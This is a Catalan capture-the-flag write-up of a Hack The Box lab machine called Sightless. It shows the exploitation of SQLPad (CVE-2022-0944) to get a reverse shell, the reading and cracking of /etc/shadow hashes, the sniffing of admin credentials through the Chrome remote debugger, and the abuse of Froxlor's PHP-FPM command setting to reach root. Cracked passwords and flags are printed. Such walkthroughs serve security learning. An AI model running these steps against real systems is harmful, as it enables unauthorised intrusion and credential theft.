Anirem directament al reconeixement actiu per fer-ne via, fent un nmap directament i saltant-nos el reconeixement passiu:
```
┌──(polkali㉿kaliPol)-[~]
└─$ nmap -sC -sV -v 10.10.11.32           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 19:48 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
Initiating Ping Scan at 19:48
Scanning 10.10.11.32 [2 ports]
Completed Ping Scan at 19:48, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:48
Completed Parallel DNS resolution of 1 host. at 19:48, 0.01s elapsed
Initiating Connect Scan at 19:48
Scanning 10.10.11.32 [1000 ports]
Discovered open port 80/tcp on 10.10.11.32
Discovered open port 21/tcp on 10.10.11.32
Discovered open port 22/tcp on 10.10.11.32
Discovered open port 8081/tcp on 10.10.11.32
Completed Connect Scan at 19:48, 3.49s elapsed (1000 total ports)
Initiating Service scan at 19:48
Scanning 4 services on 10.10.11.32
Completed Service scan at 19:48, 28.68s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.11.32.
Initiating NSE at 19:48
Completed NSE at 19:48, 10.66s elapsed
Initiating NSE at 19:48
Completed NSE at 19:49, 28.68s elapsed
Initiating NSE at 19:49
Completed NSE at 19:49, 0.01s elapsed
Nmap scan report for 10.10.11.32
Host is up (0.044s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
8081/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Froxlor
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

```

Trobem quatre ports oberts, accés a una web i a la que tinguem unes credencials ens podrem connectar per SSH. També hi ha el port 21 ftp obert i el port 8081 que tée un apache corrent darrere, sembla que tindrem vàris llocs dels quals estirar.

Abans de anar al port 80 per el navegador, farem un wget i un whatweb per veure que hi ha. Ho fem directe a la IP ja que encara no tenim el domini, i així potser el podem treure:
```
┌──(polkali㉿kaliPol)-[~]
└─$ whatweb http://10.10.11.32
http://10.10.11.32 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.32], RedirectLocation[http://sightless.htb/], Title[302 Found], nginx[1.18.0]
ERROR Opening: http://sightless.htb/ - no address for sightless.htb

```

I obtenim un resultat molt similar, veiem el mateix 302 que teniem amb el whatweb i a Location veiem a on ens ha redirigit, per el port 80.

```
┌──(polkali㉿kaliPol)-[~]
└─$ wget http://10.10.11.32
--2024-09-22 19:56:56--  http://10.10.11.32/
Connecting to 10.10.11.32:80... connected.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: http://sightless.htb/ [following]
--2024-09-22 19:56:57--  http://sightless.htb/
Resolving sightless.htb (sightless.htb)... failed: Name or service not known.
wget: unable to resolve host address ‘sightless.htb’`
```


Efectivament veiem com ens intenta redirigir al domini redirigeix al domini http://sightless.htb/ . Ara, per tant, hem de posar el nom del domini al nostre fitxer /etc/hosts:

Si anem a veure el que es serveix al port 8081 ens trobem amb una pàgina de login i el que sembla un software anomenat Froxlor, que haurem d'investigar si té alguna vulnerabilitat o potser s'hi pot fer injecció o atacar amb XSS:

![image](https://github.com/user-attachments/assets/3e3107ea-44b4-4ae8-baf7-f703285bb794)


En canvi, si anem al port 80 ens trobem que l'Apache segueix la següent pàgina:

![image](https://github.com/user-attachments/assets/28c7fcd1-3283-4591-b1e4-9615a4cea14f)


Ara mirarem el codi font (Cntrl+U) per veure si podem veure amb què o com està fet per si trobéssim un 'fet amb Wordpress' o alguna cosa per l’estil, abaix de tot de la pàgina web segurament també ho veuríem si fos el cas. He mirat les dues pàgines, tant el formulari ed login com la web de slightless però no he vist res destacable al codi font.

Passarem a analitzar i remenar les web des del navegador. Si anem a Services i cliquem aquí, veiem que hi ha un subdomini que no coneixíem ja que no hem fet cap escaneig de subdominis, l'afegirem a l' /etc/hosts per poder veure què hi ha:

![image](https://github.com/user-attachments/assets/ff067f13-870d-4a33-a157-0262bd16b762)

Gràcies a això accedim a un panell que s'anomena SQLPad, que, com anunciava la web de sightless, és una aplicació web que permet a usuaris connectar-se a a vàris servidors SQL a través del navegador:

![image](https://github.com/user-attachments/assets/3aebeda8-a5ab-4072-a3cd-926e90dd5f70)


Sembla que pot ser interessant i podrem treure suc d'aquí. He fet alguns intents d'injecció SQL però no hi ha hagut sort, provaré amb XSS o a veure si interceptan les peticions amb Burpsuite aconseguim alguna cosa més.

Remenant amb Burpsuite veiem com al accedir a l'SQLPad podem veure la versió d'aquest software:

```
`HTTP/1.1 200 OK

Server: nginx/1.18.0 (Ubuntu)

Date: Sun, 22 Sep 2024 20:11:55 GMT

Content-Type: application/json; charset=utf-8

Content-Length: 473

Connection: close

X-DNS-Prefetch-Control: off

Strict-Transport-Security: max-age=15552000; includeSubDomains

X-Download-Options: noopen

X-Content-Type-Options: nosniff

X-XSS-Protection: 0

Referrer-Policy: same-origin

ETag: W/"1d9-E+82Qgtj4TJN18ynAdqcoit4wXQ"



{"currentUser":{"id":"noauth","email":"noauth@example.com","role":"admin","name":"noauth"},"config":{"allowCsvDownload":true,"baseUrl":"","defaultConnectionId":"","editorWordWrap":false,"googleAuthConfigured":false,"localAuthConfigured":true,"publicUrl":"","samlConfigured":false,"samlLinkHtml":"Sign in with SSO","ldapConfigured":false,"ldapRolesConfigured":false,"oidcConfigured":false,"oidcLinkHtml":"Sign in with OpenID","showServiceTokensUI":false},"version":"6.10.0"}`
```

![image](https://github.com/user-attachments/assets/e53e1f98-5d77-4181-8967-f3d36c817350)

Per tant, ara que tenim la versió de l'SQLPad que és la 6.10.0 busquem si hi ha algun POC o exploit per aquesta versió en concret. Hem trobat aquest repositori a GitHub el qual sembla que funcionarà i és un POC per aquesta versió del programa: 
https://github.com/Robocopsita/CVE-2022-0944_RCE_POC 

Tal i com s'explica al repositori l'execució de l'exploit és hiper senzilla. Simplement hem d'indicar a quina url hi ha l'sqlpad i a quina IP i port escoltarem nosaltres, la màquina atacant: 

``./script.py http://admin.sightless.htb 10.10.11.2 443``

Un cop fet això ja tenim la connexió amb la màquina víctima:

```
┌──(polkali㉿kaliPol)-[~/Documents/Sightless/CVE-2022-0944_RCE_POC-main]
└─$ ./script.py http://sqlpad.sightless.htb 10.10.14.199 443     
listening on [any] 443 ...
connect to [10.10.14.199] from (UNKNOWN) [10.10.11.32] 38258
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad# whoami
whoami
root
root@c184118df0a6:/var/lib/sqlpad# `
```

Sembla que estem amb l'usuari root, tocarà investigar perquè no quadra que sigui tant senzill. Després d'investigar una mica, hem anat a l'arrel i trobem un fitxer anomenat docker-entrypoint:

```
root@c184118df0a6:/# ls
ls
bin
boot
dev
docker-entrypoint
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

Si li fem cat veiem el següent:

```
root@c184118df0a6:/# cat docker-entrypoint
cat docker-entrypoint
#!/bin/bash
set -e
# This iterates any sh file in the directory and executes them before our server starts
# Note: we intentionally source the files, allowing scripts to set vars that override default behavior.
if [ -d "/etc/docker-entrypoint.d" ]; then
    find /etc/docker-entrypoint.d -name '*.sh' -print0 | 
    while IFS= read -r -d '' line; do 
        . "$line"
    done
fi
exec node /usr/app/server.js $@`
```

Preguntant-li al ChatGPT si és part de l'inicialització d'un contenidor Docker, ens diu que sí, que sembla molt probable que ho sigui:

1. **Nom del fitxer**: El nom `docker-entrypoint` és habitual en Docker per definir el punt d'entrada d'un contenidor, que és el procés inicial que s'executa quan es posa en marxa el contenidor.
    
2. **Ruta `/etc/docker-entrypoint.d`**: Aquesta ruta és un altre indici clar, ja que moltes imatges Docker personalitzades usen aquest directori per emmagatzemar scripts d'inicialització (_entrypoint scripts_). Aquest directori es pot utilitzar per executar scripts abans d'arrencar el servei principal del contenidor.
    
3. **Comportament del script**: Aquest script busca i executa (_source_) tots els fitxers `.sh` al directori `/etc/docker-entrypoint.d`. Això és un comportament comú en un script d'entrada Docker que permet que scripts addicionals modifiquin l'entorn abans d'iniciar el procés principal del contenidor.
    

En resum, el fet que existeixi un `docker-entrypoint` i la presència d'un directori `docker-entrypoint.d` són signes molt forts que estàs en un entorn Docker.

Per tant, ara té lògica que estiguem amb l'usuari root ja que estem en un entorn Docker, per tant hem de veure si podem obtenir algunes credencials o escalar privilegis des d'aquí dins. 

Després de donar vàries voltes pels diferents directoris i fitxers, se'm ocorre que puc mirar el fitxer /etc/passwd a veure què hi trobem:

```
root@c184118df0a6:/# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
root@c184118df0a6:/# root:x:0:0:root:/root:/bin/bash
bash: root:x:0:0:root:/root:/bin/bash: No such file or directory`
```

Sembla que hi ha un usuari anomenat michael i un usuari anomenat node, ara mirarem si al fitxer /etc/shadow trobem alguna password:

```
root@c184118df0a6:/# cat /etc/shadow
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::`
```

Sembla que acabem de trobar el que podria ser un hash de la contrasenya de l'usuari michael. També el de l'usuari root. Per tant, primer hem de mirar quin tipus de hash són, per fer això, anirem a la següent web: https://hashes.com/en/decrypt/hash . Pel que se'ns diu és un hash SHA512, per tant intentarem crackejarlo amb John the Ripper, per això, genero el fitxer user_hash i hi copio el hash a dins:

``$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/``

I ara amb John intentem crackejarlo:

```
┌──(root㉿kaliPol)-[/home/polkali/Documents/Sightless]
└─# john user_hash -w=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
insaneclownposse (?)     
1g 0:00:00:10 DONE (2024-09-23 22:39) 0.09157g/s 5380p/s 5380c/s 5380C/s kruimel..cuteface
Use the "--show" option to display all of the cracked passwords reliably
Session completed. `
```


Ara, hem obtingut la password de l'usuari michael:`` insaneclownposse`` . Ara, amb aquesta password provarem d'accedir a algun dels serveis que hi ha oberts: ssh i ftp.

El primer que hem provat ha estat el servei ssh i hem pogut accedir-hi amb l'usuari michael i la seva password, obtenint així la User Flag:

```
┌──(polkali㉿kaliPol)-[~]
└─$ ssh michael@10.10.11.32                                      
The authenticity of host '10.10.11.32 (10.10.11.32)' can't be established.
ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.32' (ED25519) to the list of known hosts.
michael@10.10.11.32's password: 
Last login: Tue Sep 24 09:58:48 2024 from 10.10.14.54
michael@sightless:~$ whoami
michael
michael@sightless:~$ pwd
/home/michael
michael@sightless:~$ ls
user.txt
michael@sightless:~$ cat user.txt 
988301a6ffd5a0df33b4dfb853575730
michael@sightless:~$ 
```

Ara, intentem aconseguir la root flag. Després de moltes i moltes voltes, veiem que sembla que el formulari de login de Froxlor serà per on podrem accedir i escalar privilegis ja que trobem que Froxlor està corrent al port 8080 de la màquina.

```
michael@sightless:~$ netstat -nltp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33771         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:39793         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:45297         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
michael@sightless:~$ 
```

Veiem que per accedir al dashboard de control de Froxlor, podem utilitzar l'explotació del debugger remot de Chrome: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/ . El que hi ha és un problema de política d'execució en la configuració PHP-FPM per a l'usuari Michael a Froxlor.

Veiem que hi ha el port 8080 on corre Froxlor com dèiem i el que hem de fer és un port forwarding per poder tenir el contingut a la nostra màquina (la meva Kali Linux en el meu cas):

```
┌──(kali㉿kali)-[~]
└─$  ssh -L 8080:127.0.0.1:8080 michael@10.10.11.32
michael@10.10.11.32's password: 
Last login: Wed Nov 13 19:27:58 2024 from 10.10.14.198
michael@sightless:~$
``` 

Ara, al haver fet el port forwarding, si anem al navegador com a 127.0.0.1:8080 veurem el formulari de login del Froxlor que està corrent al port 8080:

![image](https://github.com/user-attachments/assets/10637913-f5ca-4aac-90bf-424dc37976d7)


Com a curiositat, amb localhost no funciona ja que ho detecta com a domini i diu que no està configurat:

![image](https://github.com/user-attachments/assets/e520d541-4539-4454-a131-9b1a7218661c)


Ara, al no tenir usuari per fer el login, tornem aquí: Veiem que per accedir al dashboard de control de Froxlor, podem utilitzar l'explotació del debugger remot de Chrome: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/ . El que hi ha és un problema de política d'execució en la configuració PHP-FPM per a l'usuari Michael a Froxlor. Per començar, utilitzarem el navegador Chrome per fer-ho, ja que si no evidentment no funcionarà.

Un cop estem amb el Chrome, hem de posar al navegador com si fos una URL el següent: chrome://inspect#devices i des d'aquí hem d'afegir la resta de ports clicant a Configure (excepte el 22 i el 80 ja que són l'ssh i l'http) que hem vist al fer el ``netstat -nltp`` :

![image](https://github.com/user-attachments/assets/bdfd8587-7244-4353-9f79-2407e20a1f72)

Marquem la casella de Enable port forwarding ara. 

------------------------------------------------------------

Al complicar-se'm la cosa i no poder aconseguir el que sembla que havia de funcionar, he tornat a connectar-me per ssh amb l'usuari michael, i he vist que al seu home hi ha linpeas.sh, per tant l'executem i a veure is trobem alguna cosa que ens pugui ser útil per fer l'escalació de privilegis:

Un cop llençat, he vist una cosa que sembla que pot ser interessant, a veure si ara sí que ens en sortim i podem escalar privilegis. Després de força estona d'analitzar el que pot ser interessant del que ha trobat Linpeas per escalar privilegis, veig això:

````
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                             
                      ╚════════════════════════════════════╝                                                   
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                               
strings Not Found                                                                                              
-rwsr-xr-x 1 root root 208K May 14  2024 /opt/google/chrome/chrome-sandbox                                     
-rwsr-xr-x 1 root root 47K Apr  9  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                   
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 55K Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 71K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 35K Mar 23  2022 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 72K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                        
-rwsr-xr-x 1 root root 35K Apr  9  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 19K Feb 26  2022 /usr/libexec/polkit-agent-helper-1
-rwsr-xr-x 1 root root 331K Jun 26 13:11 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

````


On, si ens hi fixem, això podria ser molt interessant:

``-rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable``

Però la versió de sudo no és vulnerable.

No hi ha hagut èxit, i tampoc amb altres coses que he anat trobant per Linpeas. Tornaré a provar la tècnica del port forwarding a veure si hi ha més sort ara. Primer de tot miro els ports de la màquina on hi ha l'usuari michael com havíem dit abans:

```
michael@sightless:~$ netstat -tpln
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:43423         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:35155         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44311         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:6969            0.0.0.0:*               LISTEN      71457/python3       
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
michael@sightless:~$
``` 


Ara, de tots aquests ports farem port forwarding cap a la meva màquina com ja havia provat anteriorment, un per un, mantenint la connexió ssh que fa el port forwarding oberta, és a dir mantenint la shell oberta d'en michael, un exemple ja que s'ha de fer amb cada un dels ports:


```
┌──(kali㉿kali)-[~]
└─$ ssh -L 43423:127.0.0.1:43423 michael@10.10.11.32
michael@10.10.11.32's password: 
Last login: Sat Nov 16 20:25:48 2024 from 10.10.15.8
michael@sightless:~$ 
```

I aquests són tots els ports amb els quals he hagut d'anar fent forwarding un per un i mantenint les consoles obertes:

```
ssh -L 35155:127.0.0.1:35155 michael@10.10.11.32
ssh -L 33060:127.0.0.1:33060 michael@10.10.11.32
ssh -L 3000:127.0.0.1:3000 michael@10.10.11.32
ssh -L 3306:127.0.0.1:3306 michael@10.10.11.32
ssh -L 44311:127.0.0.1:44311 michael@10.10.11.32
ssh -L 53:127.0.0.53:53 michael@10.10.11.32
ssh -L 8080:127.0.0.1:8080 michael@10.10.11.32
ssh -L 6969:0.0.0.0:6969 michael@10.10.11.32
```

Ara, un cop tenim el port forwarding activat obrim Google Chrome i anem a: ``chrome://inspect/#devices``

I aquí fem clic a “Configure” i afegim els ports que hem reenviat com a 127.0.0.1:port. Hem de repetir aquest pas per cada un dels ports que hem redirigit. Un cop afegits els port, veiem una connexió sota "Remote Targets". Fem clic a "Inspect" per obrir una nova finestra del navegador que ens permetrà veure el tràfic de la pàgina web.

![image](https://github.com/user-attachments/assets/1c43abce-4884-471a-b855-ad2b5d7f7394)


![image](https://github.com/user-attachments/assets/7d70b337-d9a7-47d3-b5bd-b4715b757c5d)


I ara veiem com en michael inicia sessió amb l'usuari admin i fa login i podem capturar les seves credencials gràcies al port forwarding:

![image](https://github.com/user-attachments/assets/8ab69c97-f6a7-4bea-b0c5-2b7878fb86f2)


D'aquesta manera hem obtingut les credencials i ja podem entrar al dashboard de Froxlor com a usuaris administradors:

admin
ForlorfroxAdmin

![image](https://github.com/user-attachments/assets/728142a7-07f4-4516-962d-67369a591abc)

Ara, anem a PHP -> PHP-FPM versions,on  veiem que podem carregar comandes i executar-les directament al sistema, és el mètode que utilitzarem per poder obtenir la root flag. Per fer això, utilitzarem la comanda `cp /root/root.txt /tmp/root.txt` per copiar la flag al directori /tmp per iniciar sessió com root per ssh i guardem amb Save:

![image](https://github.com/user-attachments/assets/6d0ad3e5-dcea-4b78-a95e-8be7f4b8469c)

Ara deshabilitarem i habilitarem el PHP-FPM per poder executar la comanda des de System>Settings>PHP-FPM:

![image](https://github.com/user-attachments/assets/965b492d-07fc-4d54-9f3d-b7b83dd07216)

![image](https://github.com/user-attachments/assets/38c0ea16-c5a5-4c8d-9232-d1dbb6c7e425)

![image](https://github.com/user-attachments/assets/03ff8ce6-9b06-4b6c-8346-a8c2c9e76347)


I ara tornarem a fer el mateix donant permisos de lectura al fitxer /tmp/root.txt amb la comanda chmod 644 que fa que el propietari del fitxer pugui llegir i escriure al fitxer i el grup i altres usuaris només poden llegir el fitxer, però no modificar-lo. `chmod 644 /tmp/root.txt`:

![image](https://github.com/user-attachments/assets/c28b1e62-d37f-4c2d-b9cf-aa440b7593cc)


I ara entrem per ssh amb l'usuari michael i anem al fitxer /tmp/root.txt per poder llegir la root flag:

```
┌──(kali㉿kali)-[~]
└─$ ssh michael@10.10.11.32                           
michael@10.10.11.32's password: 
Last login: Sat Nov 16 21:19:04 2024 from 10.10.15.8
michael@sightless:~$ cat /tmp/root.txt 
1bbbadb909796bd37433356aa2f30951
michael@sightless:~$ 
```

I ja hem completat la màquina:

![image](https://github.com/user-attachments/assets/4639b3b8-7cd1-43ef-b299-30ea963196c9)




